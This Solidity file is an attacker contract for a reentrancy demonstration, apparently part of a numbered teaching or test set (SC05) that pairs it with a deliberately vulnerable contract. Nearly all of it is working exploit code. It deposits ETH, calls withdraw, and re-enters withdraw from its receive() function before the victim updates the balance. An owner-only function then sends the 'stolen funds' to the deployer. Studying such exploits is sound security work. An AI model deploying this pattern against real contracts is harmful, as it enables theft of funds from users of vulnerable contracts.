// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SC05_Reentrancy_Vulnerable.sol";

/*
 * Attacker contract for SC05 Reentrancy
 * 
 * This simplified contract demonstrates the reentrancy vulnerability by:
 * 1. Receiving funds via the receive() function during withdrawal
 * 2. Attempting to make additional calls back into the vulnerable contract
 * 3. Exploiting the fact that the balance check happens before the state update
 */

contract SC05_ReentrancyAttacker {
    SC05_Reentrancy_Vulnerable public vulnerableContract;
    address public owner;
    uint256 public totalReceived = 0;
    uint256 public attackCount = 0;

    constructor(address _victimAddress) {
        vulnerableContract = SC05_Reentrancy_Vulnerable(_victimAddress);
        owner = msg.sender;
    }

    // Initiates the attack
    function attack() external payable {
        require(msg.value > 0, "Must send ETH to attack");
        
        // First, deposit the ETH
        vulnerableContract.deposit{value: msg.value}();
        
        // Check balance in the vulnerable contract
        uint256 balance = vulnerableContract.getBalance(address(this));
        require(balance > 0, "Balance should be > 0");
        
        // Withdraw - this triggers receive() which is called during the transfer
        vulnerableContract.withdraw(balance);
    }

    // This receive() is called when the contract receives ETH
    receive() external payable {
        attackCount++;
        totalReceived += msg.value;
        
        // On subsequent reentrancy attempts, check if we can still call withdraw
        // The balance hasn't been updated yet in the vulnerable contract
        uint256 remainingBalance = vulnerableContract.getBalance(address(this));
        
        // Attempt reentrancy only if balance is still available and we haven't tried too many times
        if (remainingBalance > 0 && attackCount < 3 && msg.value > 0) {
            try vulnerableContract.withdraw(remainingBalance) {
                // Reentrancy successful
            } catch {
                // Reentrancy attempt failed - this is ok, we still received funds
            }
        }
    }

    // Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    function getStats() external view returns (uint256 received, uint256 attempts) {
        return (totalReceived, attackCount);
    }
}
